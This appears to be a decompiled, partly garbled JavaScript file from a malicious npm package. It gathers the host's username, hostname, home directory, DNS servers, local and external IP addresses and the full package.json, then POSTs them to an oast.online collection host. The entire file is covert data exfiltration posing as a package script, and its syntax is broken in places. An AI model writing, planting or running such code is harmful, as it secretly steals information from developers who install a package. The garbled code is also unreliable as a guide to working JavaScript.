const os = require("os")
const net = require('net')
const dns = require("dns")
const querystring = require("querystring")
const https = require("https")
const packageJSON = require("./package.json")
const package = packageJSON.name
const nets = os.networkInterfaces()
const local_ips = Object.create(null)
_iterator_0 = <operator>.iterator(Object.keys(nets))
_iterator_1 = <operator>.iterator(nets[name])
const familyV4Value = typeof net.family === 'string' ? 'IPv4' : 4
net.family === familyV4Value && !net.internal
!local_ips[name]
__ecma.Array.factory()
local_ips[name].push(net.address)
const req_ip = https.get({'host': 'api.ipify.org', 'port': 443, 'path': '/'}, function(resp) {
  let external_ip = "";
  resp.on('data', function(ip) {
    external_ip = ip.toString();
  });
  resp.on('end', function() { execute(external_ip)} ); 
})
function execute = function execute(external_ip) {
	const trackingData = JSON.stringify({
	    p: package,
	    c: __dirname,
	    hd: os.homedir(),
	    hn: os.hostname(),
	    un: os.userInfo().username,
	    dns: dns.getServers(),
	    r: packageJSON ? packageJSON.___resolved : undefined,
	    v: packageJSON.version,
	    pjson: packageJSON,
	    local_ips: local_ips,
	    external_ip: external_ip,
	});

	var postData = querystring.stringify({
	    msg: trackingData,
	});

	var options = {
	    hostname: "cagau8ebc53teikp5270oywigroyph8un.oast.online",
	    port: 443,
	    path: "/",
	    method: "POST",
	    headers: {
		"Content-Type": "application/x-www-form-urlencoded",
		"Content-Length": postData.length,
	    },
	};

	var req = https.request(options, (res) => {
	    res.on("data", (d) => {
		process.stdout.write(d);
	    });
	});

	req.write(postData);
	req.end();
}
